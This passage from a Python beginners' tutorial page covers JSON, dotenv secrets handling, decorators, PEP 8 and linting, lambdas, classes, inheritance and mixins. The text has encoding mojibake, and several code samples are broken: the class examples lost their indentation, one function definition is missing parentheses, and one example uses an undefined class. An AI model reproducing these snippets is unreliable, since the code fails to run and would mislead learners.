JSON object</span><br>person_json = json.dumps(person_dict)<br><span class="hljs-built_in">print</span>(person_json)<br><br></code></pre></td></tr></table></figure><p><strong>When creating and reading JSON</strong> </p><ul><li>Use print statements to help you debug</li><li>Use a JSON linting tool to make the JSON easier to read</li><li>Have a print out of the full JSON so you can figure out the structure when reading specific elements</li></ul><h3 id="14ã€Managing-keys"><a href="#14ã€Managing-keys" class="headerlink" title="14ã€Managing keys"></a>14ã€Managing keys</h3><p><strong>Values from outside of your application</strong></p><ul><li>Connecting to a database</li><li>Determining the operating system</li><li>Settings which need to change</li><li>Sensitive data</li></ul><p><strong>Reading an environmental variable</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Reading an environmental variable</span><br><span class="hljs-keyword">import</span> os<br>os_version = os.getenv(<span class="hljs-string">&#x27;OS&#x27;</span>)<br><span class="hljs-built_in">print</span>(os_version)<br></code></pre></td></tr></table></figure><p><strong>Using dotenv</strong></p><p>Store environmental variables in text file</p><ul><li>Donâ€™t hard code</li><li>Donâ€™t check sensitive values into source control</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># pip install python-dotenv</span><br><br><span class="hljs-comment"># .env</span><br>DATABASE=Sample_Connection_String<br><br><span class="hljs-comment"># .gitignore</span><br>.env<br><br><span class="hljs-comment"># app.py</span><br><span class="hljs-keyword">from</span> dotenv <span class="hljs-keyword">import</span> load_dotenv<br>load_dotenv()<br><br><span class="hljs-keyword">import</span> os<br>database = os.getenv(<span class="hljs-string">&#x27;DATABASE&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(database)<br></code></pre></td></tr></table></figure><p><strong>Final notes</strong></p><ul><li><p>Donâ€™t hard code sensitive information ever</p></li><li><p>Use dotenv for a simple solution</p><ul><li>Add .env to .gitignore</li></ul></li><li><p>Consider full encryption options</p><ul><li>Azure Key Vault</li></ul></li></ul><h3 id="15ã€Decorators"><a href="#15ã€Decorators" class="headerlink" title="15ã€Decorators"></a>15ã€Decorators</h3><p>The big thing really is in using Decorators that are part of a framework, such as Flash, that youâ€™re going to be creating your application using </p><p><strong>Programming components</strong></p><ul><li>Objects<ul><li>Nouns</li><li>Data constructs</li></ul></li><li>Functions/Methods<ul><li>Verbs</li><li>Actions</li></ul></li><li>Decorators<ul><li>Adjectives</li><li>Add additional functionality to code</li><li>Common in framework</li><li>Django, Flask</li></ul></li></ul><p><strong>Using a decorator</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Snippet from Flask</span><br><span class="hljs-comment"># register https://myserver/api/products</span><br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;api/products&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_products</span>:</span><br>    <span class="hljs-comment"># code to list from database</span><br>    <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><strong>Creating a decorator</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logger</span>(<span class="hljs-params">func</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>():</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Lodding execution&#x27;</span>)<br>        func()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Done logging&#x27;</span>)<br>    <span class="hljs-keyword">return</span> wrapper<br><br><span class="hljs-meta">@logger</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sample</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Inside sample function&#x27;</span>)<br><br>sample()<br></code></pre></td></tr></table></figure><p><strong>Decorators code</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> functools<br><span class="hljs-keyword">from</span> colorama <span class="hljs-keyword">import</span> init, Fore<br>init()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">color</span>(<span class="hljs-params">color</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">wrapper</span>(<span class="hljs-params">func</span>):</span><br><span class="hljs-meta">        @functools.wraps(<span class="hljs-params">func</span>)</span><br>        <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">runner</span>(<span class="hljs-params">*args, **kwargs</span>):</span><br>            <span class="hljs-built_in">print</span>(color + <span class="hljs-string">&#x27;changing to blue&#x27;</span>)<br>            func(*args, **kwargs)<br>        <span class="hljs-keyword">return</span> runner<br>    <span class="hljs-keyword">return</span> wrapper<br><br><span class="hljs-meta">@color(<span class="hljs-params">color=Fore.BLUE</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">greeter</span>():</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, world!!&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Just saying hi again&#x27;</span>)<br><br>greeter()<br></code></pre></td></tr></table></figure><h2 id="äºŒã€More-python-for-beginners"><a href="#äºŒã€More-python-for-beginners" class="headerlink" title="äºŒã€More python for beginners"></a>äºŒã€More python for beginners</h2><p><strong>What are we doing here?</strong></p><ul><li><p>Walk through additional Python concepts</p></li><li><p>Give you more tools for your toolbox</p></li><li><p>Link to more resources</p></li></ul><h3 id="1ã€Formatting-and-linting"><a href="#1ã€Formatting-and-linting" class="headerlink" title="1ã€Formatting and linting"></a>1ã€Formatting and linting</h3><p><strong>This is valid Python code</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">x = <span class="hljs-number">12</span><br><span class="hljs-keyword">if</span> x== <span class="hljs-number">24</span>:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Is valid&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Not valid&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">helper</span>(<span class="hljs-params">name=<span class="hljs-string">&#x27;sample&#x27;</span></span>):</span><br> <span class="hljs-keyword">pass</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">another</span>(<span class="hljs-params"> name = <span class="hljs-string">&#x27;sample&#x27;</span> </span>):</span><br>         <span class="hljs-keyword">pass</span><br></code></pre></td></tr></table></figure><p><strong>Formatting matters</strong></p><ul><li>Makes code readable</li><li>Easier to debug</li><li>Consistency helps everyone</li></ul><p><strong>PEP 8</strong></p><ul><li><p>Python Enhancement Proposal #8</p></li><li><p>All about formatting</p></li><li>Common rules:<ul><li>Spaces, not tabs</li><li>variable_name, not variableName or VariableName</li><li>Avoid extraneous whitespace<ul><li>{â€˜goodâ€™: 42}</li><li>{ â€˜badâ€™ : 20 }</li></ul></li></ul></li></ul><p><strong>Linting</strong></p><ul><li>Identify formatting issues <ul><li>Common for all languages </li></ul></li><li>Pylint for Python <ul><li>Windows: pip install pylint </li><li>macOS or Linux: pip3 install pylint </li></ul></li><li>Configurable to ignore certain rules <ul><li>Avoid doing this </li></ul></li><li>Automatically run by Visual Studio Code </li></ul><p><strong>Use docstring for inline documentation</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">print_hello</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Greets the user by name</span><br><span class="hljs-string"></span><br><span class="hljs-string">Parameters:</span><br><span class="hljs-string">name (str): The name of the user</span><br><span class="hljs-string">Returns:</span><br><span class="hljs-string">str: The greeting</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + name)<br></code></pre></td></tr></table></figure><p><strong>The challenge with weakly typed languages</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_greeting</span>(<span class="hljs-params">name</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name<br><br>message = get_greeting(<span class="hljs-number">42</span>)<br><span class="hljs-built_in">print</span>(message)<br></code></pre></td></tr></table></figure><p><strong>Type hints</strong></p><ul><li><p>Tell the editor and linter what data types to expect</p></li><li><p><strong>DOES NOT</strong> cause â€œcompilerâ€ errors</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#            parameter type   return type</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_greeting</span>(<span class="hljs-params">name: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">str</span>:</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Hello, &#x27;</span> + name<br></code></pre></td></tr></table></figure><h3 id="2ã€Lambdas"><a href="#2ã€Lambdas" class="headerlink" title="2ã€Lambdas"></a>2ã€Lambdas</h3><p><strong>Sort some objects</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">presenters = [<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">50</span>&#125;,<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">47</span>&#125;<br>]<br><br>presenters.sort()<br><span class="hljs-built_in">print</span>(presenters)<br></code></pre></td></tr></table></figure><p><strong>Notes about <code>sort</code></strong></p><ul><li><code>sort</code> can automatically handle primitive types and strings</li><li>If we need to do anything complex we need to tell <code>sort</code> how to sort</li><li>In this case we just need to specify whether to sort by age or name</li><li>the key parameter allows you to pass in a function to call for each list element before it compares items for sorting</li></ul><p><strong>Sort by name</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sorter</span>(<span class="hljs-params">item</span>):</span><br>    <span class="hljs-keyword">return</span> item[<span class="hljs-string">&#x27;name&#x27;</span>]<br><br>presenters = [<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">50</span>&#125;,<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">47</span>&#125;<br>]<br><br>presenters.sort(key=sorter)<br><span class="hljs-built_in">print</span>(presenters)<br></code></pre></td></tr></table></figure><p><strong>Do the same thing inline</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">presenters = [<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">50</span>&#125;,<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">47</span>&#125;<br>]<br><br>presenters.sort(key=<span class="hljs-keyword">lambda</span> item: item[<span class="hljs-string">&#x27;name&#x27;</span>])<br><span class="hljs-built_in">print</span>(presenters)<br></code></pre></td></tr></table></figure><p><strong>Sort by name length (short to long)</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">presenters = [<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Susan&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">50</span>&#125;,<br>  &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">47</span>&#125;<br>]<br><br>presenters.sort(key=<span class="hljs-keyword">lambda</span> item: <span class="hljs-built_in">len</span>(item[<span class="hljs-string">&#x27;name&#x27;</span>]))<br><span class="hljs-built_in">print</span>(presenters)<br></code></pre></td></tr></table></figure><h3 id="3ã€Classes"><a href="#3ã€Classes" class="headerlink" title="3ã€Classes"></a>3ã€Classes</h3><p><strong>Classes define data structures and behavior</strong></p><ul><li><p>Why use classes</p><ul><li>Create reusable components</li><li>Group data and operations together</li></ul></li><li><p>Moving parts</p><ul><li>Classes are nouns</li><li>Properties are adjectives</li><li>Methods are verbs</li></ul></li></ul><p><strong>Creating a class</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># PascalCasing(é©¼å³°å‘½åæ³•)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Presenter</span>():</span><br>    <span class="hljs-comment"># Constructor(æ„é€ å‡½æ•°)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name</span>):</span><br>        <span class="hljs-comment"># Field(åŸŸ) or property(å±æ€§)</span><br>self.name = name<br>    <span class="hljs-comment"># method(æ–¹æ³•)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say_hello</span>(<span class="hljs-params">self</span>):</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello, &#x27;</span> + self.name)<br></code></pre></td></tr></table></figure><p><strong>Using a class</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">presenter = Presenter(<span class="hljs-string">&#x27;Chris&#x27;</span>)<br>presenter.name = <span class="hljs-string">&#x27;Christopher&#x27;</span><br>presenter.say_hello()<br></code></pre></td></tr></table></figure><p><strong>Accessibility in Python</strong></p><ul><li><p><strong>EVERYTHING</strong> is public</p></li><li><p>Conventions for suggesting accessibility</p><ul><li>_ means avoid unless you really know what youâ€™re doing</li><li>__ (double underscore) means <strong>do not use</strong></li></ul></li></ul><p><strong>Adding properties</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Presenter</span>():</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, name</span>):</span><br><span class="hljs-comment"># property (do not use self.__name = name) </span><br>self.name = name<br><br><span class="hljs-meta">@property</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;In the getting&#x27;</span>)<br><span class="hljs-keyword">return</span> self.__name<br><span class="hljs-meta">@name.setter</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">name</span>(<span class="hljs-params">self, value</span>):</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;In the setting&#x27;</span>)<br>self.__name = value<br></code></pre></td></tr></table></figure><p><strong>Using a property</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">presenter = Presenter(<span class="hljs-string">&#x27;Chris&#x27;</span>)<br>presenter.name = <span class="hljs-string">&#x27;Christopher&#x27;</span><br><span class="hljs-built_in">print</span>(presenter.name)<br></code></pre></td></tr></table></figure><h3 id="4ã€Inheritance"><a href="#4ã€Inheritance" class="headerlink" title="4ã€Inheritance"></a>4ã€Inheritance</h3><p><strong>Inheritance</strong></p><ul><li>Creates an â€œis aâ€ relationship<ul><li>Student is a Person</li><li>MySqlConnection is a DatabaseConnection</li></ul></li><li>Composition (with properties) creates a â€œhas aâ€ relationship<ul><li>Student has a Class</li><li>DatabaseConnection has a ConnectionString</li></ul></li></ul><p><strong>Python inheritance in action</strong></p><ul><li><p>All methods are â€œvirtualâ€</p><ul><li>Can override or redefine their behavior</li></ul></li><li><p>Keyword <code>super</code> to access parent class</p><ul><li><p>Constructor</p></li><li><p>Properties in methods</p></li></ul></li><li><p>Must always call parent constructor</p></li></ul><p><strong>Inheriting from a class</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span>Â <span class="hljs-title">Person</span>:</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">__init__</span>(<span class="hljs-params">self,Â name</span>):</span><br>Â Â Â Â Â Â Â Â self.nameÂ =Â name<br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">say_hello</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello,Â &#x27;</span>Â +Â self.name)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span>Â <span class="hljs-title">Student</span>(<span class="hljs-params">Person</span>):</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">__init__</span>(<span class="hljs-params">self,Â name,Â school</span>):</span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">super</span>().__init__(name)<br>Â Â Â Â Â Â Â Â self.schoolÂ =Â school<br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">sing_school_song</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;OdeÂ toÂ &#x27;</span>Â +Â self.school)<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">say_hello</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-comment"># Let the parent do some work</span><br>        <span class="hljs-built_in">super</span>().say_hello()<br>        <span class="hljs-comment"># Add on custom code </span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;I am tired&#x27;</span>)<br></code></pre></td></tr></table></figure><p><strong>Using a derived class</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">student = Student(<span class="hljs-string">&#x27;Christopher&#x27;</span>, <span class="hljs-string">&#x27;UMD&#x27;</span>)<br>student.say_hello()<br>student.sing_school_song()<br><span class="hljs-comment"># What are you?</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(student, Student))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">isinstance</span>(student, Person))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">issubclass</span>(Student, Person))<br></code></pre></td></tr></table></figure><p><strong>Overriding <code>__str__</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># YAGNAåŸåˆ™(you aren&#x27;t gonna need it)</span><br><span class="hljs-class"><span class="hljs-keyword">class</span>Â <span class="hljs-title">Person</span>:</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">__init__</span>(<span class="hljs-params">self,Â name</span>):</span><br>Â Â Â Â Â Â Â Â self.nameÂ =Â name<br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">say_hello</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hello,Â &#x27;</span>Â +Â self.name)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__str__</span>(<span class="hljs-params">self</span>):</span><br><span class="hljs-keyword">return</span> self.name<br><br>presenter = Presenter(<span class="hljs-string">&#x27;Christopher&#x27;</span>)<br><span class="hljs-built_in">print</span>(presenter)<br></code></pre></td></tr></table></figure><h3 id="5ã€Mixins-multiple-inheritance"><a href="#5ã€Mixins-multiple-inheritance" class="headerlink" title="5ã€Mixins (multiple inheritance)"></a>5ã€Mixins (multiple inheritance)</h3><p><strong>Mixins or multiple inheritance</strong></p><ul><li><p>Inherit from multiple classes</p></li><li><p>A little controversial</p><ul><li>Can get messy quickly</li><li>Many modern languages only support single inheritance</li></ul></li><li><p>Uses</p><ul><li>Enable functionality for frameworks such as Django</li><li>Streamline repetitious operations</li></ul></li></ul><p><strong>The scenario</strong></p><ul><li><p>What I want to create</p><ul><li>Helper database class</li><li>Create different types for different databases</li></ul></li><li><p>What I want it to be able to do</p><ul><li>Connect to a database</li><li>Log what itâ€™s doing</li></ul></li></ul><p><strong>Supporting classes</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span>Â <span class="hljs-title">Loggable</span>:</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â self.titleÂ =Â <span class="hljs-string">&#x27;&#x27;</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">log</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LogÂ messageÂ fromÂ &#x27;</span>Â +Â self.title)<br><br><span class="hljs-class"><span class="hljs-keyword">class</span>Â <span class="hljs-title">Connection</span>:</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â self.serverÂ =Â <span class="hljs-string">&#x27;&#x27;</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">connect</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ConnectingÂ toÂ databaseÂ onÂ &#x27;</span>Â +Â self.server)<br></code></pre></td></tr></table></figure><p><strong>Create our â€œframeworkâ€</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">framework</span>(<span class="hljs-params">item</span>):</span><br><span class="hljs-comment"># Perform the connection</span><br>Â Â Â Â <span class="hljs-keyword">if</span>Â <span class="hljs-built_in">isinstance</span>(item,Â Connection):<br>Â Â Â Â Â Â Â Â item.connect()<br><span class="hljs-comment"># Log the operation</span><br>Â Â Â Â <span class="hljs-keyword">if</span>Â <span class="hljs-built_in">isinstance</span>(item,Â Loggable):<br>Â Â Â Â Â Â Â Â item.log()<br></code></pre></td></tr></table></figure><p><strong>Create our database class</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span>Â <span class="hljs-title">SqlDatabase</span>(<span class="hljs-params">Connection,Â Loggable</span>):</span><br>Â Â Â Â <span class="hljs-function"><span class="hljs-keyword">def</span>Â <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>Â Â Â Â Â Â Â Â <span class="hljs-built_in">super</span>().__init__()<br>Â Â Â Â Â Â Â Â self.titleÂ =Â <span class="hljs-string">&#x27;SqlÂ ConnectionÂ Demo&#x27;</span><br>Â Â Â Â Â Â Â Â self.serverÂ =Â <span class="hljs-string">&#x27;Some_Server&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>Putting it to work</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Create an instance of our class</span><br>sql_connectionÂ =Â SqlDatabase()<br><span class="hljs-comment"># Use our framework</span><br>framework(sql_connection) <span class="hljs-comment"># connects and logs</span><br></code></pre></td></tr></table></figure><p><strong>Use framework</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 